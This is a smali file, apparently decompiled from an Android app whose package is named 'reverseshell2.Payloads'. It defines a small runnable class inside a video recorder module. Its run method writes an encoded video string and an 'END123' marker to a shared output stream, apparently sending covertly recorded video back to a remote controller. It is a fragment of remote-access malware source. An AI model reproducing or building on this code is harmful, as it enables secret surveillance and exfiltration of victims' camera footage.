.class final Lcom/example/reverseshell2/Payloads/videoRecorder$6;
.super Ljava/lang/Object;
.source "videoRecorder.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/reverseshell2/Payloads/videoRecorder;->sendData(Ljava/io/File;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic val$encodedVideo:Ljava/lang/String;


# direct methods
.method constructor <init>(Ljava/lang/String;)V
    .locals 0

    .line 241
    iput-object p1, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$6;->val$encodedVideo:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 245
    const-string v0, "UTF-8"

    :try_start_0
    sget-object v1, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;

    iget-object v2, p0, Lcom/example/reverseshell2/Payloads/videoRecorder$6;->val$encodedVideo:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStream;->write([B)V

    .line 246
    sget-object v1, Lcom/example/reverseshell2/Payloads/videoRecorder;->outputStream:Ljava/io/OutputStream;

    const-string v2, "END123\n"

    invoke-virtual {v2, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/OutputStream;->write([B)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 249
    goto :goto_0

    .line 247
    :catch_0
    move-exception v0

    .line 248
    .local v0, "ex":Ljava/io/IOException;
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    .line 250
    .end local v0    # "ex":Ljava/io/IOException;
    :goto_0
    return-void
.end method
